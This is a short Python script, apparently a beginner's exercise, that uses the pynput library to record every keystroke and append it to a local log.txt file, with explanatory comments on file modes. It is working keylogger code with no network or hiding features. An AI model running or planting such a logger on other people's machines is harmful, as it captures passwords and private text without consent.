
from pynput.keyboard import Listener          
# w= writing
# r= reading
# a= appending

#Listener - listens to keystroke
# the 'with' keyword removes the need for the close function 
def writetofile(key) :
    letter = str(key)
    letter = letter.replace("'"," ")

    with open("log.txt", 'a') as f:
        f.write(letter)
#pynput is a package responsible for inpit streams IE how a computer interperts and listens to keystrokes and mouse cloicks
with Listener(on_press=writetofile) as l:
    l.join()
